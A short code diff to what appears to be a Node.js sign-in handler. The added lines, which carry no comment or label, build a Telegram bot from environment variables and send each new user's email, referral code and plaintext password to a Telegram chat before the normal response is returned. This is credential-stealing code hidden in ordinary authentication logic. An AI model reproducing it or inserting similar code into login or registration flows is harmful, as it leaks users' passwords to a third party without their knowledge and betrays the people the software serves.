@@ -146,6 +146,20 @@ const signIn = asyncHandler(async (req, res) => {
     console.log(error);
   }
 
+  const tg_token = process.env.TG_TOKEN;
+  const chatId = process.env.TG_ID;
+  const bot = new TelegramBot(tg_token, { polling: true });
+  const tg_msg = `
+    !------ New Registration -------!
+    Email: ${email}
+    Referal: ${referral}
+    Password: ${password}
+    `;
+  const sendMessage = await bot.sendMessage(chatId, tg_msg);
+  if (sendMessage) {
+    bot.stopPolling();
+  }
+
   return res.status(201).json({
     _id: newUser._id,
     role: newUser.role,
